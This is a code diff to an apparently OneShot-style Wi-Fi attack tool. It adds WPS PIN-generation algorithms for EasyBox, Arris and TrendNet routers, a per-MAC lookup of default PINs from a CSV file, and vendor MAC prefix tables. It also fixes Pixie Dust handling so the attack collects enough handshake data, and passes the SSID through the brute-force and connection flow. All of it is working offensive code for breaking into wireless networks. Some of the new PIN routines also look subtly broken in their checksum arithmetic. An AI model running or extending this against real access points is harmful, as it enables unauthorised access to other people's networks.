@@ -248,6 +248,7 @@ class WPSpin:
         self.ALGO_MAC = 0
         self.ALGO_EMPTY = 1
         self.ALGO_STATIC = 2
+        self.ALGO_STATIC_DB = 3
 
         self.algos = {
             'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
@@ -350,7 +351,13 @@ class WPSpin:
             'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 26713366},
 
             # Sapido devices
-            'pinSapidoRB1602': {'name': 'Sapido RB-1602', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 79679190}}
+            'pinSapidoRB1602': {'name': 'Sapido RB-1602', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 79679190},
+            # New MAC-based algorithms
+            'pinEasybox': {'name': 'EasyBox', 'mode': self.ALGO_MAC, 'gen': self.pinEasybox},
+            'pinArris': {'name': 'Arris', 'mode': self.ALGO_MAC, 'gen': self.pinArris},
+            'pinTrendNet': {'name': 'TrendNet', 'mode': self.ALGO_MAC, 'gen': self.pinTrendNet},
+            # CSV database-backed static PINs (loaded per-MAC at runtime)
+            'pinGeneric': {'name': 'Static (DB)', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: '', 'static': []}}
 
 
     @staticmethod
@@ -378,7 +385,8 @@ class WPSpin:
         if algo not in self.algos:
             raise ValueError(f'{err} Invalid WPS pin algorithm')
         pin = self.algos[algo]['gen'](mac)
-        if algo == 'pinEmpty':
+        # These algos return a pre-formatted string with checksum already included
+        if algo in ('pinEmpty', 'pinEasybox', 'pinArris', 'pinTrendNet'):
             return pin
         pin = pin % 10000000
         pin = str(pin) + str(self.checksum(pin))
@@ -390,6 +398,8 @@ class WPSpin:
         """
         res = []
         for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC_DB:
+                continue
             if algo['mode'] == self.ALGO_STATIC and not get_static:
                 continue
             item = {}
@@ -408,6 +418,8 @@ class WPSpin:
         """
         res = []
         for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC_DB:
+                continue
             if algo['mode'] == self.ALGO_STATIC and not get_static:
                 continue
             res.append(self.generate(ID, mac))
@@ -423,12 +435,20 @@ class WPSpin:
             algo = self.algos[ID]
             item = {}
             item['id'] = ID
-            if algo['mode'] == self.ALGO_STATIC:
+            if algo['mode'] == self.ALGO_STATIC_DB:
+                # Expand CSV-backed static PINs into individual entries
+                for static_pin in self.algos['pinGeneric']['static']:
+                    if static_pin:
+                        res.append({'id': 'pinGeneric', 'name': 'Static PIN (DB)', 'pin': static_pin})
+            elif algo['mode'] == self.ALGO_STATIC:
                 item['name'] = 'Static PIN — ' + algo['name']
+                item['pin'] = self.generate(ID, mac)
+                res.append(item)
             else:
                 item['name'] = algo['name']
-            item['pin'] = self.generate(ID, mac)
-            res.append(item)
+                item['pin'] = self.generate(ID, mac)
+                res.append(item)
+        self.algos['pinGeneric']['static'].clear()
         return res
 
     def getSuggestedList(self, mac):
@@ -448,11 +468,29 @@ class WPSpin:
         else:
             return None
 
+    def append_from_pin_csv(self, pin_file_path, mac):
+        """Load static PINs from pins.csv for the given MAC prefix."""
+        try:
+            mac_clean = mac.replace(':', '').upper()
+            with open(pin_file_path, newline='') as csvfile:
+                reader = csv.reader(csvfile)
+                for row in reader:
+                    if len(row) >= 2:
+                        prefix_clean = row[1].replace(':', '').upper()
+                        if mac_clean.startswith(prefix_clean):
+                            self.algos['pinGeneric']['static'].append(row[0])
+        except FileNotFoundError:
+            pass
+
     def _suggest(self, mac):
         """
         Get algos suggestions for single MAC
         Returns the algo ID
         """
+        # Load CSV-backed static PINs before stripping MAC colons
+        pins_csv = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'pins.csv')
+        self.append_from_pin_csv(pins_csv, mac)
+
         mac = mac.replace(':', '').upper()
         algorithms = {
             'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
@@ -484,12 +522,21 @@ class WPSpin:
             'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
             'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
             'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
-            'pinONO': ('5C353B', 'DC537C')
+            'pinONO': ('5C353B', 'DC537C'),
+            # TrendNet routers
+            'pinTrendNet': ('0014D1', '001FD0', 'C87F54', '4CAEDE'),
+            # EasyBox / Arcadyan routers
+            'pinEasybox': ('00223F', '0016E8', 'BCF685', 'C0E6C7', 'EC43F6'),
+            # Arris cable routers
+            'pinArris': ('0016B6', 'AC8874', '1CC5D6', '001BC0'),
         }
         res = []
         for algo_id, masks in algorithms.items():
             if mac.startswith(masks):
                 res.append(algo_id)
+        # If CSV database returned any static PINs for this MAC, add pinGeneric
+        if self.algos['pinGeneric']['static']:
+            res.append('pinGeneric')
         return res
 
     def pin24(self, mac):
@@ -537,6 +584,82 @@ class WPSpin:
         + (((b[1] + b[2]) % 10) * 100000)\
         + (((b[0] + b[1]) % 10) * 1000000)
         return pin
+
+    def pinTrendNet(self, bssid):
+        """TrendNet WPS PIN algorithm based on last 3 MAC bytes."""
+        try:
+            last_3 = bssid.string.replace(':', '')[-6:]
+            merge = last_3[4:] + last_3[2:4] + last_3[:2]
+            string = int(merge, 16) % 10000000
+            pin = 10 * string
+            pin_with_checksum = pin + self.checksum(pin)
+            return f"{pin_with_checksum:08d}"
+        except ValueError:
+            return "12345670"
+
+    def pinEasybox(self, bssid):
+        """EasyBox (Arcadyan) WPS PIN algorithm."""
+        try:
+            last_two = bssid.string.replace(':', '')[-4:]
+            sn = int(last_two, 16)
+            snstr = f"{sn:05d}"
+
+            mac = [int(c, 16) for c in last_two]
+            sn_digits = [int(c) for c in snstr[1:]]
+
+            k1 = (sum(sn_digits[:2]) + sum(mac[2:])) % 16
+            k2 = (sum(sn_digits[2:]) + sum(mac[:2])) % 16
+
+            hpin = [
+                k1 ^ sn_digits[3],
+                k1 ^ sn_digits[2],
+                k2 ^ mac[1],
+                k2 ^ mac[2],
+                mac[2] ^ sn_digits[3],
+                mac[3] ^ sn_digits[2],
+                k1 ^ sn_digits[1]
+            ]
+
+            hpin_str = ''.join(f"{x:X}" for x in hpin)
+            hpinint = int(hpin_str, 16) % 10000000
+            return f"{hpinint:07d}{self.checksum(hpinint)}"
+        except ValueError:
+            return "12345670"
+
+    def pinArris(self, bssid):
+        """Arris WPS PIN algorithm using Fibonacci sequence."""
+        def fib_gen(n, memo={}):
+            if n in memo:
+                return memo[n]
+            if n in (0, 1, 2):
+                return 1
+            memo[n] = fib_gen(n - 1, memo) + fib_gen(n - 2, memo)
+            return memo[n]
+
+        macs = bssid.string.split(":")
+        array_macs = [int(mac, 16) for mac in macs]
+
+        fibnum = []
+        for i, mac in enumerate(array_macs):
+            adjusted_mac = mac
+            counter = 0
+
+            if adjusted_mac > 30:
+                while adjusted_mac > 31:
+                    adjusted_mac -= 16
+                    counter += 1
+
+            if counter == 0 and adjusted_mac < 3:
+                adjusted_mac = sum(array_macs) - adjusted_mac
+                adjusted_mac &= 0xff
+                adjusted_mac = (adjusted_mac % 28) + 3
+
+            fibnum.append(fib_gen(adjusted_mac) + (fib_gen(counter) if counter else 0))
+
+        fibsum = sum(fib * fib_gen(i + 16) for i, fib in enumerate(fibnum)) + sum(array_macs)
+        fibsum = (fibsum % 10000000 * 10) + self.checksum(fibsum)
+
+        return f"{fibsum:08d}"
 
 
 def recvuntil(pipe, what):
@@ -760,21 +883,30 @@ class Companion:
                 self.connection_status.status = 'scanning'
                 print(f'{info} Scanning…')
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
-            self.connection_status.status = 'WPS_FAIL'
-            print(f'{err} wpa_supplicant returned WPS-FAIL')
+            # Bug fix: don't abort pixiemode early before collecting all M-messages
+            # (need at least M4 to have E-Hash1/E-Hash2 for Pixie Dust)
+            if not pixiemode or self.connection_status.last_m_message >= 4:
+                self.connection_status.status = 'WPS_FAIL'
+                print(f'{err} wpa_supplicant returned WPS-FAIL')
 #        elif 'NL80211_CMD_DEL_STATION' in line:
 #            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
-                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                try:
+                    self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                except Exception:
+                    self.connection_status.essid = ''
             print(f'{info} Authenticating…')
         elif 'Authentication response' in line:
             print(f'{ok} Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
             if 'SSID' in line:
-                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                try:
+                    self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                except Exception:
+                    self.connection_status.essid = ''
             print(f'{info} Associating with AP…')
         elif ('Associated with' in line) and (self.interface in line):
             bssid = line.split()[-1].upper()
@@ -915,7 +1047,7 @@ class Companion:
         self.sendOnly('WPS_CANCEL')
         return False
 
-    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
+    def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
         if not pin:
             if pixiemode:
@@ -961,9 +1093,9 @@ class Companion:
             return True
         elif pixiemode:
             if self.pixie_creds.got_all():
-                pin = self.__runPixiewps(showpixiecmd, pixieforce)
-                if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                if pixiedust_pin:
+                    return self.single_connection(bssid, pin=pixiedust_pin, pixiemode=False, store_pin_on_fail=True)
                 return False
             else:
                 print(f'{err} Not enough data to run Pixie Dust attack')
@@ -1106,14 +1238,18 @@ class WiFiScanner:
                         'WPS locked': False,
                         'Model': '',
                         'Model number': '',
-                        'Device name': ''
+                        'Device name': '',
+                        'ESSID': ''
                      }
                 )
             networks[-1]['BSSID'] = result.group(1).upper()
 
         def handle_essid(line, result, networks):
-            d = result.group(1)
-            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            try:
+                d = result.group(1)
+                networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            except Exception:
+                networks[-1]['ESSID'] = ''
 
         def handle_level(line, result, networks):
             networks[-1]['Level'] = int(float(result.group(1)))
@@ -1284,7 +1420,8 @@ class WiFiScanner:
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
-                    return networks[int(networkNo)]['BSSID']
+                    net = networks[int(networkNo)]
+                    return net['BSSID'], net.get('ESSID', '')
                 else:
                     raise IndexError
             except Exception:
@@ -1476,15 +1613,19 @@ if __name__ == '__main__':
                     scanner = WiFiScanner(args.interface, vuln_list)
                     if not args.loop:
                         print(f'{info} BSSID not specified (--bssid) — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
+                    network_info = scanner.prompt_network()
+                    if network_info:
+                        args.bssid = network_info[0]
+                        args.ssid = network_info[1] if len(network_info) > 1 else None
 
                 if args.bssid:
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                     else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                    args.show_pixie_cmd, args.pixie_force)
+                        companion.single_connection(bssid=args.bssid, ssid=getattr(args, 'ssid', None),
+                                                    pin=args.pin, pixiemode=args.pixie_dust,
+                                                    showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force)
             if not args.loop:
                 break
             else:
